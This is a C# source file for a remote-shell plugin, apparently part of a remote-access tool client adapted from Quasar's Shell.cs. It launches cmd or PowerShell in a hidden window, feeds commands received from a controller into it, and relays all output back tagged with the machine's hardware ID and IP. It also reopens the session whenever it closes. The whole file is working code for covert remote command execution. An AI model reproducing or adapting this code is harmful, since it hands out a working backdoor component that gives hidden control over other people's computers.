using PacketLib.Packet;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Threading;

/* 
|| AUTHOR Arsium | quasar ||
|| github : https://github.com/arsium       ||
|| From : https://github.com/quasar/Quasar/blob/master/Quasar.Client/IO/Shell.cs ||
*/

namespace Plugin
{
    internal class ShellHander : IDisposable
    {
        internal ShellHander(bool isPWS)
        {
            this.isPWS = isPWS;
        }

        private bool isPWS { get; set; }
        private Process _prc;
        private bool _read;
        private readonly object _readLock = new object();
        private readonly object _readStreamLock = new object();
        private Encoding _encoding;
        private StreamWriter _inputWriter;

        private void CreateSession()
        {
            lock (_readLock)
            {
                _read = true;
            }

            var cultureInfo = CultureInfo.InstalledUICulture;
            _encoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage);

            _prc = new Process
            {
                StartInfo = isPWS ?
                new ProcessStartInfo("powershell")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = _encoding,
                    StandardErrorEncoding = _encoding,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                }
                :
                new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = _encoding,
                    StandardErrorEncoding = _encoding,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    Arguments = $"/K CHCP {_encoding.CodePage}"
                }
            };
            _prc.Start();

            RedirectIO();
        }

        private void RedirectIO()
        {
            _inputWriter = new StreamWriter(_prc.StandardInput.BaseStream, _encoding);
            new Thread(RedirectStandardOutput).Start();
            new Thread(RedirectStandardError).Start();
        }

        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
        {
            lock (_readStreamLock)
            {
                var streamBuffer = new StringBuilder();

                streamBuffer.Append((char)firstCharRead);

                // While there are more characters to be read
                while (streamReader.Peek() > -1)
                {
                    // Read the character in the queue
                    var ch = streamReader.Read();

                    // Accumulate the characters read in the stream buffer
                    streamBuffer.Append((char)ch);

                    if (ch == '\n')
                        SendAndFlushBuffer(ref streamBuffer, isError);
                }
                // Flush any remaining text in the buffer
                SendAndFlushBuffer(ref streamBuffer, isError);
            }
        }

        private void SendAndFlushBuffer(ref StringBuilder textBuffer, bool isError)
        {
            if (textBuffer.Length == 0) return;

            var toSend = ConvertEncoding(_encoding, textBuffer.ToString());

            if (string.IsNullOrEmpty(toSend)) return;

            StdOutShellSessionPacket stdOutShellSession = new StdOutShellSessionPacket(toSend)
            {
                BaseIp = Launch.clientHandler.baseIp,
                HWID = Launch.clientHandler.HWID
            };

            lock (textBuffer)
            {
                //fix display server console with lock + sleep
                Launch.clientHandler.SendPacket(stdOutShellSession);
                Thread.Sleep(1);
            }

            textBuffer.Clear();
        }

        private void RedirectStandardOutput()
        {
            try
            {
                int ch;
                // The Read() method will block until something is available
                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardOutput.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardOutput, false);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    CreateSession();
                }
            }
        }

        private void RedirectStandardError()
        {
            try
            {
                int ch;
                // The Read() method will block until something is available
                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardError.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardError, true);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    CreateSession();
                }
            }
        }

        public bool ExecuteCommand(string command)
        {
            if (_prc == null || _prc.HasExited)
            {
                try
                {
                    CreateSession();
                }
                catch (Exception)
                {

                    return false;
                }
            }

            _inputWriter.WriteLine(ConvertEncoding(_encoding, command));
            _inputWriter.Flush();

            return true;
        }

        private string ConvertEncoding(Encoding sourceEncoding, string input)
        {
            var utf8Text = Encoding.Convert(sourceEncoding, Encoding.UTF8, sourceEncoding.GetBytes(input));
            return Encoding.UTF8.GetString(utf8Text);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_readLock)
                {
                    _read = false;
                }

                if (_prc == null)
                    return;

                if (!_prc.HasExited)
                {
                    try
                    {
                        _prc.Kill();
                    }
                    catch
                    {
                    }
                }

                if (_inputWriter != null)
                {
                    _inputWriter.Close();
                    _inputWriter = null;
                }

                _prc.Dispose();
                _prc = null;
            }
        }
    }
}
